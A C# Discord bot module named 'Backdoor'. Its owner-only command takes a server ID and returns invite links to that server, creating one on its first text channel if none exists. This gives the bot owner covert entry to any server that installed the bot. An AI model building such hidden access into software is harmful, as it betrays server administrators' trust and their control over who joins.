using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Linq;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace DiscordBot.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("backdoor"), SummaryAttribute("Server invite erstellen lassen")]
        public async Task BackdoorModule(ulong GuildId)
        {
            if (!Data.Privileg.CheckById(Context.User.Id, Data.Privileg.owner))
            {
                await Context.Channel.SendMessageAsync(":x: You are not my god!");
                return;
            }

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: I am not in a guild with id=" + GuildId);
                return;
            }

            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            var Invites = await Guild.GetInvitesAsync();
            if (Invites.Count() < 1)
            {
                try
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }
                catch (Exception e)
                {
                    await Context.Channel.SendMessageAsync($":x: Creating an invit for guild {Guild.Name} went wrong with error: {e.Message}");
                    return;
                }
            }

            Invites = null;
            Invites = await Guild.GetInvitesAsync();

            EmbedBuilder Embed = new EmbedBuilder();

            Embed.WithAuthor($"Invites for guild {Guild.Name}:", Guild.IconUrl);
            Embed.WithColor(40, 200, 150);

            foreach (var Current in Invites)
                Embed.AddField("Invite:",$"[{Current.Url}]({Current.Url})");

            await Context.Channel.SendMessageAsync("", false, Embed.Build());
        }
    }
}
